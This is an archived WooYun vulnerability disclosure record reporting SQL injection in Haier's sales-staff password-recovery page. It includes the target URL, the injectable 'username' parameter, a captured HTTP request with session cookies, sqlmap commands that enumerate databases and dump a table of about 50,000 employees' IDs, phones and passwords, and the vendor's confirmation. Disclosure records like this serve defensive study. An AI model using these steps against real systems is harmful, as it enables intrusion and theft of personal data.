{"id": 45897, "wybug_id": "wooyun-2015-093653", "wybug_title": "海尔某系统SQL注入致五万多名员工的身份证、手机、工号、邮箱、密码等敏感信息泄露", "wybug_corp": "海尔集团", "wybug_author": "深度安全实验室", "wybug_date": "2015-01-24 12:32", "wybug_open_date": "2015-03-10 12:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-10：\t细节向公众公开  简要描述： 海尔某系统SQL注入致五万多名员工的身份证、手机、工号、邮箱、密码等敏感信息泄露 详细说明：  海尔某系统SQL注入致五万多名员工的身份证、手机、工号、邮箱、密码等敏感信息泄露   漏洞证明：  1.海尔直销员信息化系统网址\nhttp://shangliu.haier.com/haier/index.jsp\n2.点击 “直销员信息化系统” - “密码找回”，使用Burp Suite拦截消息，其中，username存在问题\nPOST /haier/jBean/ReturnPassword.jsp?type=getPhone HTTP/1.1Host: shangliu.haier.comUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:34.0) Gecko/20100101 Firefox/34.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestContent-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://shangliu.haier.com/haier/index.jspContent-Length: 9Cookie: _gscu_1690714239=2202419357l4h830; _gscu_345248242=22024193hib76a30; __utma=96306309.171390973.1422024193.1422024193.1422024193.1; __utmz=96306309.1422024193.1.1.utmcsr=i.links.cn|utmccn=(referral)|utmcmd=referral|utmcct=/subdomain/; _ga=GA1.2.171390973.1422024193; JSESSIONID=ADC751876ED6665B64881CA4F635FF6E.Tomcat716; trsidsssosessionid=B7225DA54A0CEFA18C7E74438EBCFEED-10.159.63.79; _gscbrs_1690714239=1; _gscbrs_345248242=1; __utmc=96306309; ZXKJSESSIONID=38e3c554-7b21-ee3b-af38-2f32c4969ee1***1; UniqueName=38e3c554-7b21-ee3b-af38-2f32c4969ee1; _acxm=a1a8347c-bab6-47dd-9687-cdbc8c060775Connection: keep-alivePragma: no-cacheCache-Control: no-cacheusername=\n3.运行sqlmap，发现23个表\nsqlmap.py -r c:\\post.txt -p username --dbs\n\n\n4.以EHUB_PORTALk库、T_IDM_USER表为例，发现五万多名员工的身份证、手机、工号、邮箱、密码等敏感信息\nsqlmap.py -r c:\\post.txt -p username -D EHUB_PORTAL -T T_IDM_USER --dump\n\n\n\n\n5.其它未深入……   修复方案：     版权声明：转载请注明来源 深度安全实验室@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-01-27 09:20 厂商回复： 谢乌云平台白帽子的测试与提醒，我方已安排人员进行处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}